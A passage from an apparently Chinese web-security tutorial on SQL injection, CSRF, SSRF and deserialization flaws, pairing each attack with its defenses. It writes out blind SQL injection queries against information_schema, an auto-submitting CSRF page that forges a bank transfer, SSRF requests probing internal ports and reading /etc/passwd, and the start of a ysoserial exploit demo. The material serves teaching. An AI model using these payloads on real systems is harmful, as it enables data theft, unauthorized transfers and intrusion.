Web 后台中，黑客可以利用 WHILE 打造死循环操作，或者定义存储过程，触发一个无限迭代等等。在这些情况下，数据库服务器因为 CPU 被迅速打满，持续 100%，而无法及时响应其他请求。</p><p>总结来说，通过 SQL 注入攻击，黑客可以绕过验证登录后台，非法篡改数据库中的数据；还能执行任意的 SQL 语句，盗取用户的隐私数据影响公司业务等等。所以，我认为，SQL 注入相当于让黑客直接和服务端的数据库进行了交互。正如我们一直所说的，应用的本质是数据，黑客控制了数据库，也就相当于控制了整个应用。</p><h3 id="如何进行-SQL-注入防护-？"><a href="#如何进行-SQL-注入防护-？" class="headerlink" title="如何进行 SQL 注入防护 ？"></a>如何进行 SQL 注入防护 ？</h3><p>三种常见的防护方法，它们分别是：使用 PreparedStatement、使用存储过程和验证输入。</p><h4 id="使用-PreparedStatement"><a href="#使用-PreparedStatement" class="headerlink" title="使用 PreparedStatement"></a>使用 PreparedStatement</h4><p>通过合理地使用 PreparedStatement，我们就能够避免 99.99% 的 SQL 注入问题。当数据库在处理一个 SQL 命令的时候，大致可以分为两个步骤：</p><ul><li>将 SQL 语句解析成数据库可使用的指令集。我们在使用 EXPLAIN 关键字分析 SQL 语句，就是干的这个事情；</li><li>将变量代入指令集，开始实际执行。之所以在批量处理 SQL 的时候能够提升性能，就是因为这样做避免了重复解析 SQL 的过程。</li></ul><p>SQL 注入是在解析的过程中生效的，用户的输入会影响 SQL 解析的结果。因此，我们可以通过使用 PreparedStatement，将 SQL 语句的解析和实际执行过程分开，只在执行的过程中代入用户的操作。这样一来，无论黑客提交的参数怎么变化，数据库都不会去执行额外的逻辑，也就避免了 SQL 注入的发生。</p><p>在 Java 中，我们可以通过执行下面的代码将解析和执行分开：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">String sql = <span class="string">"SELECT * FROM Users WHERE UserId = ?"</span>;</span><br><span class="line">PreparedStatement statement = connection.prepareStatement(sql);</span><br><span class="line">statement.setInt(<span class="number">1</span>, userId); </span><br><span class="line">ResultSet results = statement.executeQuery();</span><br></pre></td></tr></table></figure><p>PreparedStatement 为 SQL 语句的解析和执行提供了不同的“方法”，你需要分开来调用。但是，如果你在使用 PreparedStatement 的时候，还是通过字符串拼接来构造 SQL 语句，那仍然是将解析和执行放在了一块，也就不会产生相应的防护效果了。我这里给你展示了一个错误案例，你可以和上面的代码进行对比。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">String sql = <span class="string">"SELECT * FROM Users WHERE UserId = "</span> + userId;</span><br><span class="line">PreparedStatement statement = connection.prepareStatement(sql);</span><br><span class="line">ResultSet results = statement.executeQuery();</span><br></pre></td></tr></table></figure><h4 id="使用存储过程"><a href="#使用存储过程" class="headerlink" title="使用存储过程"></a>使用存储过程</h4><p>实际上，它的原理和使用 PreparedStatement 类似，都是通过将 SQL 语句的解析和执行过程分开，来实现防护。区别在于，存储过程防注入是将解析 SQL 的过程，由数据库驱动转移到了数据库本身。</p><p>还是上述的例子，使用存储过程，我们可以这样来实现：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">delimiter $$　　<span class="comment">-- 将语句的结束符号从分号;临时改为两个$$(可以是自定义)</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">PROCEDURE</span> select_user(<span class="keyword">IN</span> p_id <span class="built_in">INTEGER</span>)</span><br><span class="line"><span class="keyword">BEGIN</span></span><br><span class="line">　 <span class="keyword">SELECT</span> * <span class="keyword">FROM</span> <span class="keyword">Users</span> <span class="keyword">WHERE</span> UserId = p_id;</span><br><span class="line"><span class="keyword">END</span>$$ </span><br><span class="line">delimiter;　　<span class="comment">-- 将语句的结束符号恢复为分号</span></span><br><span class="line"><span class="keyword">call</span> select_user(<span class="number">1</span>);</span><br></pre></td></tr></table></figure><h4 id="验证输入"><a href="#验证输入" class="headerlink" title="验证输入"></a>验证输入</h4><p>防护的核心原则是，一切用户输入皆不可信。因此，SQL 注入的防护手段和 XSS 其实也是相通的，主要的不同在于：</p><ul><li>SQL 注入的攻击发生在输入的时候，因此，我们只能在输入的时候去进行防护和验证；</li><li>大部分数据库不提供针对 SQL 的编码，因为那会改变原有的语意，所以 SQL 注入没有编码的保护方案。</li></ul><p>因此，对所有输入进行验证或者过滤操作，能够很大程度上避免 SQL 注入的出现。比如，在通过 userId 获取 Users 相关信息的示例中，我们可以确认 userId 必然是一个整数。因此，我们只需要对 userId 参数，进行一个整型转化（比如，Java 中的 Integer.parseInt，PHP 的 intval），就可以实现防护了。</p><h4 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> Username <span class="keyword">FROM</span> <span class="keyword">Users</span> <span class="keyword">WHERE</span> UserId = <span class="number">1</span></span><br></pre></td></tr></table></figure><p>你现在已经知道，WHERE 语句中存在了 SQL 注入的点。那么，我们怎么才能获取到除了 Username 之外的其他字段呢？</p><p>首先盲注应该也是通过 web 端的输入来实现黑客的入侵目的的，那么黑客就可以通过观察页面的反应来动态修改自己的注入参数。比如一些提交输入框，当我们提交了参数之后页面反应正常那么就说明我们的猜测是正确的，否则继续猜。</p><p>我们都知道 MySQL 内部有一个 information_schema 的库，里面都是数据裤的元信息，那么我们就可以利用这个库进行猜测，通过观察页面的反应来验证自己的猜测是否正确。</p><p>第一步我们要知道数据的名字，那么就先猜测其长度。以下我们会用到 DATABASE(), LENGTH(), SUBSTRING(), ASCII() 四个内置函数。</p><ol><li>确定数据库长度</li></ol><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 得到数据库长度之后猜测数据库名字的每个字母。</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="keyword">name</span> <span class="keyword">FROM</span> <span class="keyword">user</span> <span class="keyword">WHERE</span> <span class="keyword">id</span> = <span class="number">1</span> <span class="keyword">AND</span> (<span class="keyword">SELECT</span> <span class="keyword">LENGTH</span>(<span class="keyword">DATABASE</span>()) = <span class="number">4</span>);</span><br></pre></td></tr></table></figure><ol start="2"><li>确定数据库名字 通过 ASCII 码方式</li></ol><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 根据 ASCII 码猜测是可以使用二分法来猜测。假设的到的结果是 test。</span></span><br><span class="line"><span class="comment">-- 得到数据库名字之后，猜测 user 表有多少个列。</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="keyword">name</span> <span class="keyword">FROM</span> <span class="keyword">user</span> <span class="keyword">WHERE</span> <span class="keyword">id</span> = <span class="number">1</span> <span class="keyword">AND</span> (<span class="keyword">SELECT</span> <span class="keyword">ASCII</span>(<span class="keyword">SUBSTRING</span>(<span class="keyword">DATABASE</span>(), <span class="number">1</span>, <span class="number">1</span>)) &lt; <span class="number">128</span>);</span><br></pre></td></tr></table></figure><ol start="3"><li>获取该表有多少列</li></ol><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 获取到列的多少列之后，就可以获取到每一列的长度了。</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="keyword">name</span> <span class="keyword">FROM</span> <span class="keyword">user</span> <span class="keyword">WHERE</span> <span class="keyword">id</span> = <span class="number">1</span> <span class="keyword">AND</span> ((<span class="keyword">SELECT</span> <span class="keyword">COUNT</span>(*) <span class="keyword">FROM</span> information_schema.COLUMNS <span class="keyword">WHERE</span> table_name = <span class="string">'user'</span> <span class="keyword">AND</span> TABLE_SCHEMA = <span class="string">'test'</span>) = <span class="number">3</span>);</span><br></pre></td></tr></table></figure><ol start="4"><li>获取列长</li></ol><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 最后，获取每一列的具体值。</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="keyword">name</span> <span class="keyword">FROM</span> <span class="keyword">user</span> <span class="keyword">WHERE</span> <span class="keyword">id</span> = <span class="number">1</span> <span class="keyword">AND</span> ((<span class="keyword">SELECT</span> <span class="keyword">LENGTH</span>(column_name) <span class="keyword">FROM</span> information_schema.COLUMNS <span class="keyword">WHERE</span> table_name = <span class="string">'user'</span> <span class="keyword">AND</span> TABLE_SCHEMA = <span class="string">'test'</span> <span class="keyword">LIMIT</span> <span class="number">0</span>, <span class="number">1</span>) = <span class="number">2</span>);</span><br></pre></td></tr></table></figure><ol start="5"><li>获取列名，同样是使用 ASCII 码方式</li></ol><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">name</span> <span class="keyword">FROM</span> <span class="keyword">user</span> <span class="keyword">WHERE</span> <span class="keyword">id</span> = <span class="number">1</span> <span class="keyword">AND</span> ((<span class="keyword">SELECT</span> <span class="keyword">ASCII</span>(<span class="keyword">SUBSTRING</span>(column_name, <span class="number">1</span>, <span class="number">1</span>)) <span class="keyword">FROM</span> information_schema.COLUMNS <span class="keyword">WHERE</span> table_name = <span class="string">'user'</span> <span class="keyword">AND</span> TABLE_SCHEMA = <span class="string">'test'</span> <span class="keyword">LIMIT</span> <span class="number">0</span>, <span class="number">1</span>) &lt; <span class="number">120</span>)</span><br></pre></td></tr></table></figure><p>为了故事的顺利发展这里我假设我们已知表名 user，但是我们可以根据同样的逻辑从 information_schema.TABLES 表中获取 test 库的所有表信息。</p><p>最后，我感觉这个方式有点傻啊，因为它依赖一些很特定的条件，比如后端没有做 SQL 注入的防护，而且还必须结合前端页面的反应。</p><pre style="display:none;"><!--1. 先判断字段的第一个字符是否在a-z中，如下所示，<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> Username <span class="keyword">from</span> <span class="keyword">Users</span> <span class="keyword">where</span> UserId = <span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span> = (<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> information_schema.columns <span class="keyword">WHERE</span> table_name=<span class="string">'Users’ and COLUMN_NAME REGEXP '</span>^[a-z]<span class="string">')</span></span><br></pre></td></tr></table></figure>如果结果显示Username那就说明字段的第一个字符在a到z中，2. 使用二分查找法在a到z之间查找第一个字符，如下语句，<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> Username <span class="keyword">from</span> <span class="keyword">Users</span> <span class="keyword">where</span> UserId = <span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span> = (<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> information_schema.columns <span class="keyword">WHERE</span> table_name=<span class="string">'Users’ and COLUMN_NAME REGEXP '</span>^a[a-z]<span class="string">')</span></span><br></pre></td></tr></table></figure>如果能显示Username，那么就说明a是第一个字符，再依次去查第二个字符，反之，换一个字符再试。3. 以此类推，可以找到所有的字段名。顺便说下，字段名中可能包含其他字符，如 _ 等，可以在正则表达式中同样去匹配。--></pre><p><strong>小结</strong></p><p><img src="/images/security/security-web/7.jpg" alt="7"></p><h2 id="CSRF-SSRF"><a href="#CSRF-SSRF" class="headerlink" title="CSRF/SSRF"></a>CSRF/SSRF</h2><p>前面 2 种常见的 Web 攻击：XSS 和 SQL 注入。它们分别篡改了原始的 HTML 和 SQL 逻辑，从而使得黑客能够执行自定义的功能。那么除了对代码逻辑进行篡改，黑客还能通过什么方式发起 Web 攻击呢？</p><p>我们还是先来看一个例子。在平常使用浏览器访问各种网页的时候，是否遇到过，自己的银行应用突然发起了一笔转账，又或者，你的微博突然发送了一条内容？</p><p>在我们学习 XSS 之后，你可能会联想到，这是银行或者微博中出现了某个 XSS 漏洞。但问题是，你今天并没有访问过银行或者微博的页面，所以并没有“被 XSS”的机会。这时，你想到，会不会是你今天访问的其他网页里存在一些恶意的攻击，实现了你不知道的转账和发博行为呢？</p><h3 id="CSRF-攻击是如何产生的？"><a href="#CSRF-攻击是如何产生的？" class="headerlink" title="CSRF 攻击是如何产生的？"></a>CSRF 攻击是如何产生的？</h3><p>当我们在访问一个 Web 页面的时候，并不是我们自己去获取页面信息，而是浏览器去获取了这些信息，并将它们进行了展示。这就说明，你允许浏览器代表你去和 Web 的服务端进行交互。为了能够准确地代表你的身份，浏览器通常会在 Cookie 中存储一些必要的身份信息。所以，在我们使用一个网页的时候，只需要在首次访问的时候登录就可以了。</p><p>从用户体验上来说，这当然是非常方便的。但是，黑客正是利用这一点，来编写带有恶意 JavaScript 脚本的网页，通过“钓鱼”的方式诱导你访问。然后，黑客会通过这些 JavaScript 脚本窃取你保存在网页中的身份信息，通过仿冒你，让你的浏览器发起伪造的请求，最终执行黑客定义的操作。而这一切对于你自己而言都是无感知的。这就是 CSRF（Cross-Site Request Forgery，跨站请求伪造）攻击。</p><p>接下来，我们就以银行转账为例子，来详细讲解一下这个攻击过程。</p><p>当你在银行页面发起一笔转账时，这个过程其实是通过一个转账接口来完成的。这个接口的内容可能包括下面这些内容：</p><ul><li>接口地址：<a href="http://bank.com/transfer" target="_blank" rel="noopener">http://bank.com/transfer</a> ；</li><li>HTTP 方法：POST；</li><li>接口参数：to（目标账户）、amount（金额）。</li></ul><p>在转账之前，你肯定进行了一次登录。这样一来，这个转账接口就可以通过你之前存储在 Cookie 中的相关字段来完成认证了。所以，这个接口参数中不需要包含任何身份认证相关的信息。也正是因为如此，这个接口满足了 CSRF 攻击的基本条件：</p><ul><li>使用 Cookie 进行认证；</li><li>参数中不包含任何隐私信息。</li></ul><p>于是，黑客可以构造一个如下的空白网页。我们假设这个网页的地址为 hacker.com。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"http://bank.com/transfer"</span> <span class="attr">method</span>=<span class="string">"POST"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"to"</span> <span class="attr">value</span>=<span class="string">"hacker"</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"amount"</span> <span class="attr">value</span>=<span class="string">"10000.00"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">      <span class="built_in">document</span>.forms[<span class="number">0</span>].submit();</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>在 HTML 中，<code>&lt;script&gt;</code>标签内的 JavaScript 脚本会在打开网页的时候自动执行。因此，一旦用户访问了这个 hacker.com 的页面，它就会自动提交 form 表单，向<a href="http://bank.com/transfer这个接口（假设为转账接口）发起一个" target="_blank" rel="noopener">http://bank.com/transfer这个接口（假设为转账接口）发起一个</a> POST 请求。</p><p>其中，to 和 amount 这两个参数，代表着用户向黑客的账号转账 10000 元。只要这个用户之前登录过 bank.com，并且账户余额大于 10000 元，那么黑客就能够成功地收到这 10000 元的转账了。在这个网页中，<code>&lt;input&gt;</code>的标签带有“hidden”属性，所以这整个过程对于用户来说都是不可见的。</p><p><img src="/images/security/security-web/8.jpg" alt="8"></p><h3 id="通过-CSRF-攻击，黑客能做什么？"><a href="#通过-CSRF-攻击，黑客能做什么？" class="headerlink" title="通过 CSRF 攻击，黑客能做什么？"></a>通过 CSRF 攻击，黑客能做什么？</h3><p>和 XSS 一样，CSRF 也可以仿冒用户去进行一些功能操作的请求，比如修改密码、转账等等，相当于绕过身份认证，进行未授权的操作。</p><p>值得一提的是，尽管黑客通过 CSRF 能进行的操作没有 XSS 丰富，但 CSRF 在传播和攻击成本上都低于 XSS。这也就是说，即使你的网页中没有任何注入漏洞，但只要接口配置不当，就能够被 CSRF 利用。而黑客也只需要在自己的域名中，搭建一个诱导性的网页，就可以让任何访问网页的用户都遭受到 CSRF 攻击。而且，用户每天需要访问大量的网页，根本没有办法确认每一个网页的合法性。而从严格意义上来说，用户根本没有办法防止 CSRF 攻击。因此，我们只能从应用本身入手去加强防护。</p><h3 id="如何进行-CSRF-防护？"><a href="#如何进行-CSRF-防护？" class="headerlink" title="如何进行 CSRF 防护？"></a>如何进行 CSRF 防护？</h3><p>那究竟该怎么进行 CSRF 防护呢？我们有两种方法。行业内标准的 CSRF 防护方法是 CSRFToken。 我们先来看这个方法。</p><p>通过前面的学习，我们知道，CSRF 是通过自动提交表单的形式来发起攻击的。所以，在前面转账的例子中，黑客可以通过抓包分析出 <a href="http://bank.com/transfer" target="_blank" rel="noopener">http://bank.com/transfer</a> 这个接口所需要的参数，从而构造对应的 form 表单。因此，我们只需要在这个接口中，加入一个黑客无法猜到的参数，就可以有效防止 CSRF 了。这就是 <code>CSRF Token</code> 的工作原理。</p><p><img src="/images/security/security-web/9.jpg" alt="9"></p><p>因为 CSRF Token 是每次用户正常访问页面时，服务端随机生成返回给浏览器的。所以，每一次正常的转账接口调用，都会携带不同的 CSRF Token。黑客没有办法进行提前猜测，也就没有办法构造出正确的表单了。</p><p><strong>除了 CSRF Token 之外，我们也可以通过二次验证来加强防护。</strong></p><p>回想一下，当你进行各类支付操作的时候，银行网页通常会要求你输入支付密码。你可能会觉得奇怪，明明自己已经登录了，为什么还需要输入一个独立的支付密码呢？这其实和 CSRF Token 的原理一样：这个独立的支付密码是需要用户输入的，只存在于用户的记忆中，因此，也是黑客无法获取到的参数。</p><p>怎么理解呢？假如说，黑客通过 CSRF 攻击，替你发起了一笔转账。在支付的时候，银行会发起一个全新的页面，让你验证支付密码。这个时候你发现，这个支付请求不是你本人发起的，那你肯定不会输入支付密码来完成验证。所以，在用户进行支付这样的敏感操作时，应用通常会要求用户提供一些私密的信息，就是为了对 CSRF 攻击进行防护。</p><p>讲到这里，你现在对 CSRF 的攻击和防护，应该有了一个大概的了解。简单来说，CSRF 其实就是黑客利用浏览器存储用户 Cookie 这一特性，来模拟用户发起一次带有认证信息的请求，比如转账、修改密码等。防护 CSRF 的原理也很简单，在这些请求中，加入一些黑客无法得到的参数信息即可，比如 CSRF Token 或者独立的支付密码等。掌握了这些内容，其实 CSRF 的知识基本上就差不多了。</p><h3 id="SSRF：同样的原理，发生在服务端又会发生什么？"><a href="#SSRF：同样的原理，发生在服务端又会发生什么？" class="headerlink" title="SSRF：同样的原理，发生在服务端又会发生什么？"></a>SSRF：同样的原理，发生在服务端又会发生什么？</h3><p>在 CSRF 中，黑客通过诱导用户访问某个网站，让用户的浏览器发起一个伪造的请求。那么，如果服务端发起了这个伪造的请求，又会发生什么呢？</p><p>我们知道，服务端也有代理请求的功能：用户在浏览器中输入一个 URL（比如某个图片资源），然后服务端会向这个 URL 发起请求，通过访问其他的服务端资源来完成正常的页面展示。</p><p>这个时候，只要黑客在输入中提交一个内网 URL，就能让服务端发起一个黑客定义的内网请求，从而获取到内网数据。这就是 SSRF（Server Side Request Forgery，服务端请求伪造）的原理。而服务端作为内网设备，通常具备很高的权限，所以，这个伪造的请求往往因为能绕过大部分的认证和授权机制，而产生很严重的后果。</p><p>比方说，当我们在百度中搜索图片时，会涉及图片的跨域加载保护，百度不会直接在页面中加载图片的源地址，而是将地址通过 GET 参数提交到百度服务器，然后百度服务器请求到对应的图片，再返回到页面展示出来。</p><p>这个过程中，百度服务器实际上会向另外一个 URL 地址发起请求（比如，上图中的<a href="http://s1.sinaimg.cn）。利用这个代理发起请求的功能，黑客可以通过提交一个内网的地址，实现对内网任意服务的访问。这就是" target="_blank" rel="noopener">http://s1.sinaimg.cn）。利用这个代理发起请求的功能，黑客可以通过提交一个内网的地址，实现对内网任意服务的访问。这就是</a> SSRF 攻击的实现过程，也就是我们常说的“内网穿透”。</p><p><img src="/images/security/security-web/10.jpg" alt="10"></p><h3 id="通过-SSRF-攻击，黑客能做什么？"><a href="#通过-SSRF-攻击，黑客能做什么？" class="headerlink" title="通过 SSRF 攻击，黑客能做什么？"></a>通过 SSRF 攻击，黑客能做什么？</h3><p>了解了 SSRF 攻击的过程之后，我们知道，在服务端不做任何保护措施的情况下，黑客可以利用 SSRF 向内网发起任意的 HTTP 请求。那么，这些请求会产生什么样的后果呢？我总结了一下，主要会有这样两种动作：内网探测和文件读取。</p><h4 id="内网探测"><a href="#内网探测" class="headerlink" title="内网探测"></a>内网探测</h4><p>内外网一般是隔离的。所以，黑客在外网环境中，是无法知道内网有哪些服务器，这些服务器又分别提供了哪些服务。但是，通过一个加载图片的 SSRF 漏洞，黑客就能够对内网进行探测。</p><p>在前面百度搜图的例子中，我们请求的地址是：<a href="https://image.baidu.com/search/detail?objurl=http://s1.sinaimg.cn/picture.jpg。因为http://s1.sinaimg.cn/picture.jpg会正常返回一个图片，所以网页会展示出来对应的图片。" target="_blank" rel="noopener">https://image.baidu.com/search/detail?objurl=http://s1.sinaimg.cn/picture.jpg。因为http://s1.sinaimg.cn/picture.jpg会正常返回一个图片，所以网页会展示出来对应的图片。</a></p><p>我们假定这样一个服务端逻辑：在这个请求过程中，服务端会判断 objurl 返回数据的 Content Type 是否为 image/jpeg。那么，可能的返回结果就有三种：</p><ul><li>“是”，则展示图片；</li><li>“不是”，则返回“格式错误”；</li><li>无响应，则返回“找不到图片”。</li></ul><p>基于这三种返回逻辑，黑客可以构造一个恶意的请求地址：<a href="https://image.baidu.com/search/detail?objurl=127.0.0.1:3306。如果服务器返回“格式错误”，则代表服务端本地的" target="_blank" rel="noopener">https://image.baidu.com/search/detail?objurl=127.0.0.1:3306。如果服务器返回“格式错误”，则代表服务端本地的</a> 3306 端口可用；如果返回“找不到图片”，则代表不可用。我们知道，3306 是 MySQL 对应的端口号，因此，根据这个返回的信息，黑客就能够知道服务端本地是否开启了一个 MySQL 服务。接下来，黑客只需要不断重复这个过程，尝试不同的 IP 和端口号，就能够一点一点探测出整个内网的结构。</p><h4 id="文件读取"><a href="#文件读取" class="headerlink" title="文件读取"></a>文件读取</h4><p>服务器除了对图片的代理不做合法性判断之外，对很多其他的代理也不做判断，而是直接将代理的结果返回到前端。我们称这种情况为“有回显的 SSRF”。在这种情况下，黑客不仅能够知道请求是否成功了，还能够知道具体返回的内容。</p><p>在 URI 中，开头的 http:// 和 https:// 代表需要使用什么协议去进行请求。除了 HTTP 之外，URI 还有很多种协议可以选择，比如 file:// 就是直接读取本地的文件。通过输入 file://etc/passwd，黑客就能够通过一个请求获取到本地的 passwd 文件，从而知道本地有哪些用户。经过不断地尝试，黑客就能够把整个服务器中的文件内容都给拉取出来，这其中包括密钥、源码等极度敏感的信息。</p><h3 id="如何进行-SSRF-防护？"><a href="#如何进行-SSRF-防护？" class="headerlink" title="如何进行 SSRF 防护？"></a>如何进行 SSRF 防护？</h3><p>因为 SSRF 漏洞起源于业务的正常功能需求（比如百度图片的图片请求等等）。因此，我们很难真正消除它。尽管如此，我还是会为你介绍几种常见的防护手段，来尽可能地提高应用的安全性。这些常见的手段主要包括：白名单限制、协议限制和请求端限制。</p><p>白名单的限制永远是最简单、最高效的防护措施。 SSRF 中的白名单，就是对用户提交上来的目标 URL 进行限制。比如，只允许是同一个域名下的 URL。你可以理解为，让百度图片的代理服务只允许代理 baidu.com 的 URL。但是，很多时候，因为业务功能的设计，白名单的限制并不可行。比如，上述百度图片的例子，这个功能的设计思路就是，baidu.com 这个域名下能够请求各类域名下的图片资源（比如上述例子中的 sinaimg.cn）。</p><p>在这种时候，我们可以对协议和资源类型等进行限制。比如：对于使用协议，我们只允许 HTTP 或者 HTTPS 协议；对于返回的内容，我们只允许图片格式的内容。通过这些限制，虽然不能完全阻止黑客发起 SSRF 攻击，但也大大降低了黑客能够造成的危害。</p><p>除此之外，因为 SSRF 最终的结果，是接受代理请求的服务端发生数据泄露。所以，SSRF 防护不仅仅涉及接收 URL 的服务端检测，也需要接受代理请求的服务端进行配合。在这种情况下，我们就需要用到请求端限制，它的防护措施主要包括两个方面。</p><p>第一，为其他业务提供的服务接口尽量使用 POST，避免 GET 的使用。因为，在 SSRF 中（以及大部分的 Web 攻击中），发起一个 POST 请求的难度是远远大于 GET 请求的。因为默认的请求方式是 GET，而发起 POST 请求，需要在发起 HTTP 请求的时候进行配置。很多安全漏洞中不包含能够配置协议的地方。在上述百度图片的例子中，黑客显然就只能发起 GET 请求。如果某个敏感服务是 POST 的，黑客就无法请求到相关资源了。</p><p>第二，为其他业务提供的服务接口，最好每次都进行验证。通过 SSRF，黑客只能发起请求，并不能获取到服务端存储的验证信息（如认证的 key 和 secret 等）。因此，只要接受代理请求的端对每次请求都进行完整的验证，黑客无法成功通过验证，也就无法完成请求了。</p><p><strong>小结</strong></p><p><img src="/images/security/security-web/11.jpg" alt="11"></p><h2 id="反序列化漏洞"><a href="#反序列化漏洞" class="headerlink" title="反序列化漏洞"></a>反序列化漏洞</h2><p>你一定使用过一些序列化和反序列化的工具，比如 Fastjson 和 Jackson 等。如果你关注这些工具的版本更新，就会发现，这些版本更新中包含很多修复反序列化漏洞的改动。</p><h3 id="反序列化漏洞是如何产生的？"><a href="#反序列化漏洞是如何产生的？" class="headerlink" title="反序列化漏洞是如何产生的？"></a>反序列化漏洞是如何产生的？</h3><p>序列化和反序列化有很多种实现方式。比如 Java 中的 Serializable 接口（或者 Python 中的 pickle）可以把应用中的对象转化为二进制的字节流，把字节流再还原为对象；还有 XML 和 JSON 这些跨平台的协议，可以把对象转化为带格式的文本，把文本再还原为对象。</p><p>那反序列化漏洞到底是怎么产生的呢？问题就出在把数据转化成对象的过程中。在这个过程中，应用需要根据数据的内容，去调用特定的方法。而黑客正是利用这个逻辑，在数据中嵌入自定义的代码（比如执行某个系统命令）。应用对数据进行反序列化的时候，会执行这段代码，从而使得黑客能够控制整个应用及服务器。这就是反序列化漏洞攻击的过程。</p><p>事实上，基本上所有语言都会涉及反序列化漏洞。其中，Java 因为使用范围比较广，本身体积也比较庞大， 所以被曝出的反序列化漏洞最多。下面，我就以 Java 中一个经典的反序列化漏洞 demo <a href="https://github.com/frohoff/ysoserial" target="_blank" rel="noopener">ysoserial</a>  为基础，来介绍一个经典的反序列化漏洞案例，</p><p>最终的演示 demo 的代码如下所示。在 macOS 环境下运行这段代码，你就能够打开一个计算器。（在 Windows 环境下，将系统命令 open -a calculator 修改成 calc 即可。）注意，这里需要依赖 3.2.1 以下的 commons-collections，最新的版本已经对这个漏洞进行了修复，所以无法重现这个攻击的过程。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Deserialize</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String... args)</span> <span class="keyword">throws</span> ClassNotFoundException, IllegalAccessException, InvocationTargetException, InstantiationException, 